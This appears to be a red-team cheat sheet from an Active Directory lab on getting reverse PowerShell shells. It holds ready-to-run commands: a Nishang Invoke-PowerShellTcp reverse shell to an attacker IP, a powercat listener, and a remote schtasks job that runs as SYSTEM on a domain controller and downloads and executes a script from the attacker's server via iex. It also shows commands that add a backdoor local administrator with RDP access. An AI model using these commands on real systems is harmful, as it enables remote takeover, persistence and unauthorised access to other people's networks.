---
description: Reverse PowerShell
---

# Reverse Shell

## Sending reverse shell.

### [Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

```text
Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port 4444
```

## Setting up Listener

### powercat

{% embed url="https://github.com/besimorhino/powercat" %}

```text
powercat -l -p 4444 -v -t 1024
```

{% hint style="warning" %}
Do not forget about **Windows Firewall.** Add inbound rule!
{% endhint %}

### Schtask

Set up webserver \(e.g. HFS\) on port 80 and powercat on port 4444

```text
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.78/Invoke-PowerShellTcp.ps1'''); Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.78 -Port 4444'"
```

## Adding new user

Adding already existing domain users to LocalAdmin group:

```text
net localgroup administrators dcorp\student182 /add
```

{% hint style="info" %}
Try PowerShell remoting with that account now.
{% endhint %}

Instead of creating reverse shell you may try adding new Local Admin /w RDP

```text
net user /add rtest Heslo123 
& net localgroup administrators rtest /add 
& net localgroup "remote desktop users" rtest /add
```

{% hint style="warning" %}
RDP may not work if it is disabled globally
{% endhint %}

